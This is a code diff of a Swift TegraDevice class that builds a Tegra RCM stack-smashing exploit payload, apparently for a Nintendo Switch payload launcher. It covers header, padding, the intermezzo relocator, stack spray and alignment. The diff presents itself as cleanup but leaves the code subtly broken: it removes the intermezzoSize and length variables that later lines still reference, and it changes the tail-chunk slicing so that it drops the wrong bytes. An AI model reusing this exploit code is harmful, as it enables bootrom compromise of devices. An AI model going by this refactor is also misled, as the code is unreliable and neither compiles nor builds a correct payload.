@@ -230,7 +230,6 @@ class TegraDevice {
             throw TegraDeviceError.IoIfaceNotFound(step: "[error] dereference fail during writeSingleBuffer", code: 0)
         }
         
-        
         toggleBuffer()
         
         var mutableData = data
@@ -267,8 +266,6 @@ class TegraDevice {
             print("[debug] Switching to high buffer by writing padding")
             let padding = [UInt8](repeating: 0, count: 0x1000)
             try write(data: padding)
-        } else {
-            print("[debug] Already on high buffer")
         }
     }
     
@@ -336,54 +333,34 @@ class TegraDevice {
             throw TegraDeviceError.NoIntermezzo // in case they delete it from the app's contents for some weird reason
         }
         
-        print("[debug] Loaded intermezzo.bin (\(intermezzoData.count) bytes)")
+        print("[debug] Loaded intermezzo.bin.")
         
         let deviceId = try readDeviceId()
         print("[debug] Found a Tegra with Device ID: \(deviceId.map { String(format: "%02x", $0) }.joined())")
         
         print("[debug] Setting ourselves up to smash the stack...")
         
-        
         var payload = [UInt8]()
         
-        
-        let length = MAX_PAYLOAD_LENGTH
-        payload += withUnsafeBytes(of: UInt32(length).littleEndian) { Array($0) }
-        
-        
-        let paddingTo680 = 680 - payload.count
-        payload += [UInt8](repeating: 0, count: paddingTo680)
-        
-        
-        let intermezzoSize = intermezzoData.count
+        payload += withUnsafeBytes(of: UInt32(MAX_PAYLOAD_LENGTH).littleEndian) { Array($0) }
+        payload += [UInt8](repeating: 0, count: 680 - payload.count)
         payload += [UInt8](intermezzoData)
-        
-        
         
         let currentOffset = RCM_PAYLOAD_ADDR + UInt32(intermezzoSize)
         let paddingToPayloadStart = Int(PAYLOAD_START_ADDR - currentOffset)
         payload += [UInt8](repeating: 0, count: paddingToPayloadStart)
         
-        
         let payloadBytes = [UInt8](payloadData)
         let firstChunkSize = Int(STACK_SPRAY_START - PAYLOAD_START_ADDR)
         payload += payloadBytes.prefix(firstChunkSize)
-        
-        
-        let repeatCount = Int(STACK_SPRAY_END - STACK_SPRAY_START) / 4
+
         let sprayValue = withUnsafeBytes(of: RCM_PAYLOAD_ADDR.littleEndian) { Array($0) }
-        for _ in 0..<repeatCount {
+        for _ in 0..<(Int(STACK_SPRAY_END - STACK_SPRAY_START) / 4) {
             payload += sprayValue
         }
         
-        
-        let remainderSize = payloadBytes.count - firstChunkSize
-        payload += payloadBytes.dropFirst(firstChunkSize)
-        
-        
-        let payloadLength = payload.count
-        let paddingToAlign = 0x1000 - (payloadLength % 0x1000)
-        payload += [UInt8](repeating: 0, count: paddingToAlign)
+        payload += payloadBytes.dropFirst(payloadBytes.count - firstChunkSize)
+        payload += [UInt8](repeating: 0, count: 0x1000 - (payload.count % 0x1000))
         
         setProgressTo(progress: 40.0)
         if payload.count > length {
